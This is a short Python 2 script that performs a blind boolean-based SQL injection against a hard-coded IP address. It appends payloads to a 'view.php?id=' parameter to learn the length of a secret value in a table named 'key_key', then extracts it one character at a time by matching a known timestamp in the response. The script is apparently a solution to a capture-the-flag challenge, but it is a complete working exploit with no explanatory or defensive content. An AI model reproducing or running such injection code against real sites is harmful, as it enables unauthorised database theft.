import requests

s = requests.session()

url = 'http://132.228.23.169/view.php?id=10'

list = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

key = ''

length = 0

for i in xrange(50):
    payload = " and (select length(val) from key_key)=%s" % i
    payload_url = url + payload
    r = s.get(payload_url)
    if '2009-06-03 02:06:01' in r.text:
        length = i
        break
print "length is %s" % length

for i in range(1, length + 1):
    for j in list:
        payload = " and (select ascii(substring(val, %s, 1)) from key_key)=%s" % (i, ord(j))
        payload_url = url + payload
        r = s.get(payload_url)
        if '2009-06-03 02:06:01' in r.text:
            key += j
            print "key is %s" % key
            break
